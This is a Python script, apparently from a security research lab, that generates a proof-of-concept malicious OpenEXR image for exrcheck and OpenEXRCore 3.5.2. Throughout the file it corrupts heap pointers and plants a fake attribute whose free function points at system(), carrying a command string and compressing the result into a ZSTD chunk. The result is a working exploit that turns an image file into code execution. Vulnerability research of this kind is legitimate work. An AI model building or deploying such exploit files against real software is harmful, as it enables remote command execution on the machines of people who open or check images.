#!/usr/bin/env python3
"""W211: rebuild W202's benign command chain for the shipped `exrcheck -s -c`
in-memory stream API against pinned OpenEXRCore 3.5.2.

Two measured differences from the file-path chain are compensated here:

* the live `entries[0]` slot sits at destination + 1088 (W195's file-path dump
  used + 1104);
* the sink destination shifts by one 16-byte heap chunk with the ZSTD frame
  length.  Pointer values therefore stay fixed at 0x55555582ab70 and the
  second (non-chain) segment is all 0x01 so the destination lands at
  outPtr+3072 == 0x55555582a700, putting the fake attribute exactly at the
  file-carried address.

All pointers, the target, the system address and the command string are
carried in the EXR; gdb and ASLR-off only make the absolute addresses stable.
"""
import importlib.util
import os
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
LAB = HERE.parent
spec = importlib.util.spec_from_file_location('w202', HERE / 'make_w202_poc.py')
w202 = importlib.util.module_from_spec(spec)
spec.loader.exec_module(w202)

OUT = HERE / 'w211-stream-chain.exr'
P_ATTR = 0x55555582AB70
SLOT, O_ATTR = 1088, 0x470
SEG2_BYTE = 1


def build():
    d = bytearray(w202.DUMP.read_bytes())
    N = w202.N
    o_opaque, o_payload = O_ATTR + 64, O_ATTR + 248
    assert o_payload + w202.COPY_LEN <= len(d)

    d[SLOT:SLOT + 8] = struct.pack('<Q', P_ATTR)
    d[O_ATTR:O_ATTR + len(w202.COMMAND)] = w202.COMMAND
    d[O_ATTR + 20:O_ATTR + 24] = struct.pack('<I', 31)  # EXR_ATTR_OPAQUE
    d[O_ATTR + 24:O_ATTR + 32] = struct.pack('<Q', P_ATTR + 64)

    d[o_opaque + 0:o_opaque + 4] = struct.pack('<i', 0)
    d[o_opaque + 4:o_opaque + 8] = struct.pack('<i', w202.COPY_LEN)
    d[o_opaque + 8:o_opaque + 16] = struct.pack('<II', 0, 0)
    d[o_opaque + 16:o_opaque + 24] = struct.pack('<Q', 0)
    d[o_opaque + 24:o_opaque + 32] = struct.pack('<Q', P_ATTR + 248)
    d[o_opaque + 32:o_opaque + 48] = bytes(16)
    d[o_opaque + 48:o_opaque + 56] = struct.pack('<Q', w202.TARGET)

    d[o_payload:o_payload + w202.FREE_FN_OFF] = bytes(w202.FREE_FN_OFF)
    d[o_payload + w202.FREE_FN_OFF:o_payload + w202.COPY_LEN] = struct.pack(
        '<Q', w202.SYSTEM)

    seg1 = bytes(d[0::2] + d[1::2])
    seg2 = bytes([SEG2_BYTE]) * (w202.U - 2 * N)
    inner = (struct.pack('<Q', 2 * N) + seg1
             + struct.pack('<Q', w202.U - 2 * N) + seg2)
    with tempfile.NamedTemporaryFile(delete=False) as tf:
        tf.write(inner)
        tmp = tf.name
    payload = subprocess.run(['zstd', '-q', '-c', '-19', tmp],
                             capture_output=True, check=True).stdout
    os.unlink(tmp)
    frame = (struct.pack('<Q', 8248453963162350458) + struct.pack('<I', 1)
             + struct.pack('<I', 0) + struct.pack('<Q', len(payload)) + payload)

    data = (w202.BASE).read_bytes()
    p = 8
    while True:
        if data[p] == 0:
            p += 1
            break
        p = data.index(b'\x00', p) + 1
        p = data.index(b'\x00', p) + 1
        (sz,) = struct.unpack_from('<i', data, p)
        p += 4 + sz
    (off0,) = struct.unpack_from('<Q', data, p)
    assert off0 == p + 8
    (y,) = struct.unpack_from('<i', data, off0)
    counts = [1] * 63 + [N]
    cum, tbl = 0, bytearray()
    for c in counts:
        cum = max(cum, c)
        tbl += struct.pack('<I', cum)
    chunk = (struct.pack('<i', y) + struct.pack('<qqq', len(tbl), len(frame), w202.U)
             + tbl + frame)
    OUT.write_bytes(data[:off0] + chunk)
    print(f'poc: N={N} U={w202.U} frame={len(frame)} wrote={len(data[:off0]+chunk)}')


if __name__ == '__main__':
    build()
